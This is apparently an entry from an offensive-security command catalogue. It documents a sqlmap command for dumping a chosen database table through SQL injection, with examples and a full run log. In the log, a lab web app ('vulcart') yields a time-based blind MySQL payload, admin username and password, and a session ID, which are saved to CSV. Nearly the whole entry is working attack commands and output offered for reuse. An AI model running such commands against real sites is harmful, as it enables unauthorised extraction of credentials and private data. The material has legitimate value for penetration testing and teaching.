---
id: eb875a2f-8a08-47a3-8088-caca41a0c909
name: sqlmap-dump-specific-table
type: command
executor: bash
data: sqlmap -u '$_TARGET_URL' -D $_DB_NAME -T $_TABLE_NAME --dump
output: >2
          ___
         __H__
   ___ ___[,]_____ ___ ___  {1.2.7#stable}
  |_ -| . [']     | .'| . |

  |___|_  [(]_|_|_|__,|  _|
        |_|V          |_|   http://sqlmap.org

  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior
  mutual consent is illegal. It is the end user's responsibility to obey all
  applicable local, state and federal laws. Developers assume no liability and
  are not responsible for any misuse or damage caused by this program


  [*] starting at 23:30:55


  [23:30:55] [WARNING] provided value for parameter 'term' is empty. Please,
  always use only valid parameter values so sqlmap could be able to run properly

  [23:30:55] [INFO] resuming back-end DBMS 'mysql' 

  [23:30:55] [INFO] testing connection to the target URL

  sqlmap got a 302 redirect to 'http://192.168.43.68:80/vcart/login.php'. Do you
  want to follow? [Y/n] y

  sqlmap resumed the following injection point(s) from stored session:

  ---

  Parameter: term (GET)
      Type: AND/OR time-based blind
      Title: MySQL >= 5.0.12 AND time-based blind
      Payload: term=%' AND SLEEP(5) AND '%'='
  ---

  [23:30:58] [INFO] the back-end DBMS is MySQL

  web application technology: Apache 2.4.41, PHP 7.1.32

  back-end DBMS: MySQL >= 5.0.12

  [23:30:58] [INFO] fetching columns for table 'admindetails' in database
  'vulcart'

  [23:30:58] [WARNING] time-based comparison requires larger statistical model,
  please wait.............................. (done)                         

  [23:30:59] [WARNING] it is very important to not stress the network connection
  during usage of time-based payloads to prevent potential disruptions 

  do you want sqlmap to try to optimize value(s) for DBMS delay responses
  (option '--time-sec')? [Y/n] y

  [23:31:34] [INFO] adjusting time delay to 1 second due to good response times

  3

  [23:31:34] [INFO] retrieved: username

  [23:32:21] [INFO] retrieved: password

  [23:33:19] [INFO] retrieved: sessionid

  [23:34:16] [INFO] fetching entries for table 'admindetails' in database
  'vulcart'

  [23:34:16] [INFO] fetching number of entries for table 'admindetails' in
  database 'vulcart'

  [23:34:16] [INFO] retrieved: 1

  [23:34:19] [WARNING] (case) time-based comparison requires reset of
  statistical model, please wait..............................
  (done)                

  admin

  [23:34:52] [INFO] retrieved: wtdf9c7g5ks0l4v

  [23:36:54] [INFO] retrieved: admin

  Database: vulcart

  Table: admindetails

  [1 entry]

  +-----------------+----------+----------+

  | sessionid       | username | password |

  +-----------------+----------+----------+

  | wtdf9c7g5ks0l4v | admin    | admin    |

  +-----------------+----------+----------+


  [23:37:24] [INFO] table 'vulcart.admindetails' dumped to CSV file
  '/root/.sqlmap/output/192.168.43.68/dump/vulcart/admindetails.csv'

  [23:37:24] [INFO] fetched data logged to text files under
  '/root/.sqlmap/output/192.168.43.68'


  [*] shutting down at 23:37:24
created_at: '2020-08-19T19:04:18.105290+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
  - Web
tags:
  - sqlmap
  - sqli
  - dump
verified: true
validated: true
---

# sqlmap-dump-specific-table

## Command

```bash
sqlmap -u '$_TARGET_URL' -D $_DB_NAME -T $_TABLE_NAME --dump
```

## Description

This command exploits a confirmed SQL injection vulnerability to dump all contents from a specific table in a targeted database. It uses time-based blind techniques for MySQL backends, retrieving columns and rows progressively, and saves the output to CSV files for easy analysis.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u '$_TARGET_URL' | Vulnerable URL with injection point (e.g., http://192.168.43.68/vcart/search.php?term=) | Yes |
| -D $_DB_NAME | Target database name (e.g., vulcart) | Yes |
| -T $_TABLE_NAME | Specific table to dump (e.g., admindetails) | Yes |
| --dump | Extract and dump table contents | Yes |

## Examples

### Basic Usage

```bash
sqlmap -u 'http://example.com/search.php?term=' -D vulcart -T admindetails --dump
```

### Advanced Usage

```bash
sqlmap -u 'http://example.com/search.php?term=' -D vulcart -T admindetails --dump --batch
```

## Expected Output

The command outputs progress logs, retrieved data, and a formatted table dump, followed by file save confirmations.

```
[INFO] retrieved: username
[INFO] retrieved: password
Database: vulcart
Table: admindetails
[1 entry]
+-----------------+----------+----------+
| sessionid       | username | password |
+-----------------+----------+----------+
| wtdf9c7g5ks0l4v | admin    | admin    |
+-----------------+----------+----------+
[INFO] table 'vulcart.admindetails' dumped to CSV file '/root/.sqlmap/output/example.com/dump/vulcart/admindetails.csv'
```

## Related

- [[procedures/Dump-Database-Contents-Using-SQLMap]]
- [[tools/sqlmap]]
